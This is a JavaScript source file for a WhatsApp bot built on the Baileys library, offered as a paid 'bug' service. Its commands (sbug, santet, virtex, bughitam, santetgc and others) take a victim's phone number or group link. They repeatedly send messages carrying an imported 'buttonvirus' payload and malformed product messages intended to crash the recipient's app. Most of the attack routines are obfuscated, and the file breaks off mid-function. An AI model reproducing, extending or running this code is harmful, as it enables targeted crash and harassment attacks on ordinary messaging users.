const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El Diablo'
global.ownerNumber = ["6281220670449@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}

module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)


const _0x542bba=_0x24eb;(function(_0x328416,_0x316c1a){const _0x4be780=_0x24eb,_0x3c578c=_0x328416();while(!![]){try{const _0x36efc1=-parseInt(_0x4be780(0x10c))/0x1+parseInt(_0x4be780(0x110))/0x2+parseInt(_0x4be780(0x10b))/0x3*(parseInt(_0x4be780(0x109))/0x4)+parseInt(_0x4be780(0x107))/0x5+parseInt(_0x4be780(0x10f))/0x6+-parseInt(_0x4be780(0x10d))/0x7*(-parseInt(_0x4be780(0x108))/0x8)+parseInt(_0x4be780(0x10a))/0x9*(-parseInt(_0x4be780(0x112))/0xa);if(_0x36efc1===_0x316c1a)break;else _0x3c578c['push'](_0x3c578c['shift']());}catch(_0x49d363){_0x3c578c['push'](_0x3c578c['shift']());}}}(_0x393e,0x7c399));function _0x393e(){const _0x2c8c61=['2961078rZdnzN','547084UCvgHK','image/jpeg','1380320XohKkm','4706220AtFvkg','544PPPbrG','76qSZfts','144tzxknC','82626rfnZRy','444636aWPDqo','95774vgoTEk','0@s.whatsapp.net'];_0x393e=function(){return _0x2c8c61;};return _0x393e();}function _0x24eb(_0x3cd81c,_0x293b08){const _0x393ed9=_0x393e();return _0x24eb=function(_0x24ebdc,_0x15bf39){_0x24ebdc=_0x24ebdc-0x107;let _0x5638f0=_0x393ed9[_0x24ebdc];return _0x5638f0;},_0x24eb(_0x3cd81c,_0x293b08);}const lep={'key':{'fromMe':![],'participant':_0x542bba(0x10e),...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':_0x542bba(0x111),'caption':''+buttonvirus,'jpegThumbnail':ppnyauser}}};

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

switch (command) {

case 'jubzmenu':
let uptime = await runtime(process.uptime())
jiren = ` 
亗╭┬─────────────────┈ 
亗├ 「 JUBZCODE BOT 」
亗├──────────────────┈
亗├ • .sbug (62xxx)
亗├ • .terorbug (62xxx)
亗├ • .santet (62xxx)
亗├ • .virtex (62xxx)
亗├ • .sendbug (62xxx)
亗├ • .bughitam (62xxx)
亗├ • .svi (62xxx)
亗├ • .crash (62xxx)
亗├ • .sendcrash (62xxx)
亗├ NOTE : 
亗├ 62XXX ITU PASTE NO KORBAN
亗├ contoh : bug1 62826578172
亗├──────────────────┈
亗├ 「 VIP BOTZ 」
亗├──────────────────┈
亗├ • FITUR CHAT ADMIN
亗├──────────────────┈
亗├ 「𝙊𝙏𝙃𝙀𝙍」
亗├──────────────────┈
亗├ • ${prefix}ping ( untuk cek status )
亗├ • ${prefix}restart ( untuk restart )
亗├──────────────────┈
亗├ 「Price List Lain」
亗├ SEWA BOT 35K
亗├ MEMBER BOT 15K
亗├ JADI BOT 80K
亗├──────────────────┈
亗├ 「JubzCode」
亗├ @JubzCodeId
亗├──────────────────┈
`
diablobotwhatsapp.reply(jiren)
break
case 'addprem1':
    if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281220670449`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await diablo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${bnnd} Telah Menjadi Prem!!!`)
break
case 'delprem1':
    if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281220670449`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${ya} Telah Di Hapus Prem!!`)
break
case 'santetgc':
   const _0x4cc6f9=_0x16b6;(function(_0x222756,_0x422ad6){const _0x234892=_0x16b6,_0x250da5=_0x222756();while(!![]){try{const _0x2ad22c=-parseInt(_0x234892(0xa8))/0x1*(-parseInt(_0x234892(0x8f))/0x2)+-parseInt(_0x234892(0x90))/0x3+-parseInt(_0x234892(0x8d))/0x4+-parseInt(_0x234892(0xa0))/0x5*(-parseInt(_0x234892(0x96))/0x6)+-parseInt(_0x234892(0x94))/0x7*(parseInt(_0x234892(0xa6))/0x8)+parseInt(_0x234892(0x8e))/0x9*(-parseInt(_0x234892(0x95))/0xa)+parseInt(_0x234892(0xa1))/0xb;if(_0x2ad22c===_0x422ad6)break;else _0x250da5['push'](_0x250da5['shift']());}catch(_0x1be804){_0x250da5['push'](_0x250da5['shift']());}}}(_0x2a24,0x3115c));if(!itsMediablo)return diablobotwhatsapp[_0x4cc6f9(0x9c)](mess[_0x4cc6f9(0x92)]);if(!q)return diablobotwhatsapp[_0x4cc6f9(0x9c)](_0x4cc6f9(0x98)+(prefix+command)+_0x4cc6f9(0x93));if(!isUrl(args[0x0])&&!args[0x0][_0x4cc6f9(0x9f)](_0x4cc6f9(0x9a)))throw _0x4cc6f9(0xa9);let resultny=args[0x0][_0x4cc6f9(0xa7)](_0x4cc6f9(0xa4))[0x1],pler=await diablo['groupAcceptInvite'](resultny);function _0x16b6(_0x48629b,_0x1b88e9){const _0x2a242d=_0x2a24();return _0x16b6=function(_0x16b619,_0x533d84){_0x16b619=_0x16b619-0x8b;let _0x3ce0f0=_0x2a242d[_0x16b619];return _0x3ce0f0;},_0x16b6(_0x48629b,_0x1b88e9);}jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':ppnyauser},{'upload':diablo[_0x4cc6f9(0x97)]}),catalog=generateWAMessageFromContent(pler,proto['Message'][_0x4cc6f9(0x9b)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':_0x4cc6f9(0x8c),'title':_0x4cc6f9(0xa5),'description':''+buttonvirus+buttonvirus,'currencyCode':_0x4cc6f9(0x9d),'priceAmount1000':'100000000000000000','productImageCount':0x1,'firstImageId':0x1,'salePriceAmount1000':_0x4cc6f9(0x99),'retailerId':'Nomor\x20Owner\x20Di\x20Atas','url':_0x4cc6f9(0xa2)},'businessOwnerJid':_0x4cc6f9(0xa3)}}),{'userJid':from,'quoted':lep});diablo[_0x4cc6f9(0x8b)](pler,catalog[_0x4cc6f9(0xaa)],{'messageId':catalog[_0x4cc6f9(0x9e)]['id']}),await sleep(ms(waktu));}diablobotwhatsapp['reply'](_0x4cc6f9(0x91));function _0x2a24(){const _0x36269e=['Contoh\x20','1000','whatsapp.com','fromObject','reply','IDR','key','includes','250885afrmhd','2763288LrNYFx','https://wa.me/0','6281220670449@s.whatsapp.net','https://chat.whatsapp.com/','MAMPUS\x20FC\x20CHUAKS','226880DptNxd','split','452iYMyxu','Link\x20Invalid!','message','relayMessage','7091718154232528','127972NkPwaD','957654LnkJhs','1124dQzYVC','994758KyJLkl','SUKSES','owner','\x20linkgc','21irTbgt','10wuRckZ','30tnqLlP','waUploadToServer'];_0x2a24=function(){return _0x36269e;};return _0x2a24();}
break
case 'restart':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'ping':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
diablobotwhatsapp.reply(respon)
}
break
case 'svi':
case 'santet':const _0x45295e=_0x5361;function _0x5361(_0x52d562,_0x3b0f8a){const _0x450830=_0x4508();return _0x5361=function(_0x5361ac,_0x48db94){_0x5361ac=_0x5361ac-0x138;let _0x20c9e3=_0x450830[_0x5361ac];return _0x20c9e3;},_0x5361(_0x52d562,_0x3b0f8a);}function _0x4508(){const _0x120eed=['640584mDrUrq','6DAOKzb','9916530NEgTvH','\x20Dengan\x20Timer\x20','2FBJjVh','sendMessage','31584Oyawgn','\x20Sebanyak\x20','197002xqDhNM','646095QTUDlT','1588727SfAfOD','reply','Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20','770272OesAxo','27MwGuXn'];_0x4508=function(){return _0x120eed;};return _0x4508();}(function(_0x34023a,_0x29127f){const _0x4af495=_0x5361,_0x1e0bbf=_0x34023a();while(!![]){try{const _0x50a028=-parseInt(_0x4af495(0x143))/0x1*(parseInt(_0x4af495(0x138))/0x2)+parseInt(_0x4af495(0x145))/0x3+-parseInt(_0x4af495(0x13f))/0x4+parseInt(_0x4af495(0x139))/0x5*(parseInt(_0x4af495(0x140))/0x6)+-parseInt(_0x4af495(0x13a))/0x7+-parseInt(_0x4af495(0x13d))/0x8*(parseInt(_0x4af495(0x13e))/0x9)+parseInt(_0x4af495(0x141))/0xa;if(_0x50a028===_0x29127f)break;else _0x1e0bbf['push'](_0x1e0bbf['shift']());}catch(_0x436340){_0x1e0bbf['push'](_0x1e0bbf['shift']());}}}(_0x4508,0x3f187));{if(!itsMediablo)return diablobotwhatsapp[_0x45295e(0x13b)](mess['owner']);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x45295e(0x144)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp[_0x45295e(0x13b)](_0x45295e(0x13c)+num+_0x45295e(0x146)+jumlah+_0x45295e(0x142)+waktu);}
break
case 'sbug':
   function _0x10b7(){const _0x504935=['12XCBPpK','3jElcfd','\x20Sebanyak\x20','455766SdGhwB','16suweVJ','1260153foiksh','Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20','@s.whatsapp.net','\x20Dengan\x20Timer\x20','5588rtclTZ','1147440mpBenR','50xuvlik','1470413lWZynx','sendMessage','10316031ZAsQEW','2420tetqyG','reply','4847970NKECgY','owner'];_0x10b7=function(){return _0x504935;};return _0x10b7();}const _0x34bf09=_0x258c;function _0x258c(_0x204bb4,_0x4f8d65){const _0x10b7d9=_0x10b7();return _0x258c=function(_0x258cc3,_0x56f858){_0x258cc3=_0x258cc3-0x175;let _0x41a1d5=_0x10b7d9[_0x258cc3];return _0x41a1d5;},_0x258c(_0x204bb4,_0x4f8d65);}(function(_0x34133d,_0x135023){const _0x1ea4d6=_0x258c,_0x2607fc=_0x34133d();while(!![]){try{const _0x25895f=parseInt(_0x1ea4d6(0x186))/0x1+-parseInt(_0x1ea4d6(0x17a))/0x2*(parseInt(_0x1ea4d6(0x184))/0x3)+-parseInt(_0x1ea4d6(0x179))/0x4*(-parseInt(_0x1ea4d6(0x17f))/0x5)+-parseInt(_0x1ea4d6(0x181))/0x6+-parseInt(_0x1ea4d6(0x17c))/0x7*(-parseInt(_0x1ea4d6(0x187))/0x8)+-parseInt(_0x1ea4d6(0x175))/0x9*(parseInt(_0x1ea4d6(0x17b))/0xa)+parseInt(_0x1ea4d6(0x17e))/0xb*(parseInt(_0x1ea4d6(0x183))/0xc);if(_0x25895f===_0x135023)break;else _0x2607fc['push'](_0x2607fc['shift']());}catch(_0x14b560){_0x2607fc['push'](_0x2607fc['shift']());}}}(_0x10b7,0x639f5));{if(!itsMediablo)return diablobotwhatsapp[_0x34bf09(0x180)](mess['owner']);if(!q)return;num=''+q+_0x34bf09(0x177),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo['sendMessage'](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp[_0x34bf09(0x180)](_0x34bf09(0x176)+num+_0x34bf09(0x185)+jumlah+_0x34bf09(0x178)+waktu);}{if(!itsMediablo)return diablobotwhatsapp['reply'](mess['owner']);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x34bf09(0x17d)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp[_0x34bf09(0x180)](_0x34bf09(0x176)+num+_0x34bf09(0x185)+jumlah+_0x34bf09(0x178)+waktu);}{if(!itsMediablo)return diablobotwhatsapp['reply'](mess[_0x34bf09(0x182)]);if(!q)return;num=''+q+_0x34bf09(0x177),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x34bf09(0x17d)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp['reply'](_0x34bf09(0x176)+num+'\x20Sebanyak\x20'+jumlah+_0x34bf09(0x178)+waktu);}
                break
case '': 
const _0x44f402=_0x4b30;(function(_0x4aa2e7,_0x387ab7){const _0x32f093=_0x4b30,_0x3c9bbb=_0x4aa2e7();while(!![]){try{const _0x3ff0d8=-parseInt(_0x32f093(0x13b))/0x1*(-parseInt(_0x32f093(0x133))/0x2)+-parseInt(_0x32f093(0x13a))/0x3+-parseInt(_0x32f093(0x13c))/0x4+parseInt(_0x32f093(0x138))/0x5+-parseInt(_0x32f093(0x12c))/0x6*(-parseInt(_0x32f093(0x131))/0x7)+-parseInt(_0x32f093(0x136))/0x8*(-parseInt(_0x32f093(0x12f))/0x9)+-parseInt(_0x32f093(0x13d))/0xa*(parseInt(_0x32f093(0x12e))/0xb);if(_0x3ff0d8===_0x387ab7)break;else _0x3c9bbb['push'](_0x3c9bbb['shift']());}catch(_0x36a2c8){_0x3c9bbb['push'](_0x3c9bbb['shift']());}}}(_0x122d,0x7a297));function _0x122d(){const _0x4ba23e=['reply','4910CMAVXV','@s.whatsapp.net','owner','8QrvIKp','Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20','4066090CSRXjh','sendMessage','440421KuhbSw','143XLenZD','1399776iaYVys','10292810UsEueJ','2153562zruQqV','\x20Sebanyak\x20','11EFPUAQ','4528773nFVTKV','\x20Dengan\x20Timer\x20','7IpZnvC'];_0x122d=function(){return _0x4ba23e;};return _0x122d();}{if(!itsMediablo)return diablobotwhatsapp[_0x44f402(0x132)](mess[_0x44f402(0x135)]);if(!q)return;num=''+q+_0x44f402(0x134),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x44f402(0x139)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp[_0x44f402(0x132)](_0x44f402(0x137)+num+_0x44f402(0x12d)+jumlah+'\x20Dengan\x20Timer\x20'+waktu);}function _0x4b30(_0x437405,_0x22254b){const _0x122d31=_0x122d();return _0x4b30=function(_0x4b308e,_0x445f72){_0x4b308e=_0x4b308e-0x12c;let _0x5f1fab=_0x122d31[_0x4b308e];return _0x5f1fab;},_0x4b30(_0x437405,_0x22254b);}{if(!itsMediablo)return diablobotwhatsapp[_0x44f402(0x132)](mess[_0x44f402(0x135)]);if(!q)return;num=''+q+_0x44f402(0x134),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x44f402(0x139)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp['reply'](_0x44f402(0x137)+num+_0x44f402(0x12d)+jumlah+'\x20Dengan\x20Timer\x20'+waktu);}{if(!itsMediablo)return diablobotwhatsapp[_0x44f402(0x132)](mess['owner']);if(!q)return;num=''+q+_0x44f402(0x134),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x44f402(0x139)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp[_0x44f402(0x132)](_0x44f402(0x137)+num+_0x44f402(0x12d)+jumlah+_0x44f402(0x130)+waktu);}
            break
case 'terorbug':
case 'virtex' : const _0x5bb522=_0x3b5f;(function(_0x505cd2,_0x398434){const _0x204656=_0x3b5f,_0x16a95b=_0x505cd2();while(!![]){try{const _0x1891ce=parseInt(_0x204656(0x8a))/0x1*(-parseInt(_0x204656(0x83))/0x2)+-parseInt(_0x204656(0x91))/0x3*(-parseInt(_0x204656(0x89))/0x4)+parseInt(_0x204656(0x8c))/0x5*(parseInt(_0x204656(0x8f))/0x6)+parseInt(_0x204656(0x8b))/0x7*(-parseInt(_0x204656(0x8e))/0x8)+-parseInt(_0x204656(0x88))/0x9*(parseInt(_0x204656(0x92))/0xa)+-parseInt(_0x204656(0x8d))/0xb*(-parseInt(_0x204656(0x86))/0xc)+-parseInt(_0x204656(0x84))/0xd*(-parseInt(_0x204656(0x80))/0xe);if(_0x1891ce===_0x398434)break;else _0x16a95b['push'](_0x16a95b['shift']());}catch(_0xb9945a){_0x16a95b['push'](_0x16a95b['shift']());}}}(_0x3c9a,0x81685));function _0x3c9a(){const _0x42fd4b=['8QTBEWp','2816718sfWYRA','reply','287658SoVPYY','637490HpMxuf','\x20Dengan\x20Timer\x20','1333346DzWiyJ','sendMessage','owner','86MeHxwX','13OOgMlK','@s.whatsapp.net','36rYWlcn','\x20Sebanyak\x20','126tmoZge','44TcHhfH','4675tObbtY','4558631dDfIab','5DXTIxe','2402983EsZXRb'];_0x3c9a=function(){return _0x42fd4b;};return _0x3c9a();}function _0x3b5f(_0x1f6436,_0x402f4a){const _0x3c9aad=_0x3c9a();return _0x3b5f=function(_0x3b5f56,_0x35808c){_0x3b5f56=_0x3b5f56-0x80;let _0x1e17df=_0x3c9aad[_0x3b5f56];return _0x1e17df;},_0x3b5f(_0x1f6436,_0x402f4a);}{if(!itsMediablo)return diablobotwhatsapp[_0x5bb522(0x90)](mess[_0x5bb522(0x82)]);if(!q)return;num=''+q+_0x5bb522(0x85),jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x5bb522(0x81)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp[_0x5bb522(0x90)]('Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20'+num+_0x5bb522(0x87)+jumlah+'\x20Dengan\x20Timer\x20'+waktu);}{if(!itsMediablo)return diablobotwhatsapp[_0x5bb522(0x90)](mess['owner']);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='5',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x5bb522(0x81)](num,{'sticker':ppnyauser},{'quoted':lep}),await sleep(ms(waktu));}diablobotwhatsapp['reply']('Sukses\x20Send\x20Bug\x20Ke\x20Nomor\x20'+num+_0x5bb522(0x87)+jumlah+_0x5bb522(0x93)+waktu);}
        break
        case 'trava':
case 'bughitam': function _0x5cfb(){const _0x1baa58=['reply','14538220gATKyc','@s.whatsapp.net','6284365IdFAMs','owner','16792yCsNTp','6STsQDb','922744YADLLc','1754216RVuVsQ','3bzCELX','6285773822576@s.whatsapp.net','2054372OCQtNO','FC\x20YA\x20CHUAKS','33JbnPSd','6309hxpaux','5040735986035760','\x20Dengan\x20Timer\x20','3483186hgJvFi'];_0x5cfb=function(){return _0x1baa58;};return _0x5cfb();}const _0x1084f4=_0x3291;(function(_0xa221bd,_0xd54138){const _0x253c46=_0x3291,_0x40eb1b=_0xa221bd();while(!![]){try{const _0x35fa07=-parseInt(_0x253c46(0x12a))/0x1+-parseInt(_0x253c46(0x12b))/0x2+parseInt(_0x253c46(0x12c))/0x3*(parseInt(_0x253c46(0x12e))/0x4)+-parseInt(_0x253c46(0x126))/0x5*(parseInt(_0x253c46(0x129))/0x6)+parseInt(_0x253c46(0x122))/0x7+-parseInt(_0x253c46(0x128))/0x8*(parseInt(_0x253c46(0x11f))/0x9)+-parseInt(_0x253c46(0x124))/0xa*(-parseInt(_0x253c46(0x130))/0xb);if(_0x35fa07===_0xd54138)break;else _0x40eb1b['push'](_0x40eb1b['shift']());}catch(_0x47e21f){_0x40eb1b['push'](_0x40eb1b['shift']());}}}(_0x5cfb,0xce2f5));function 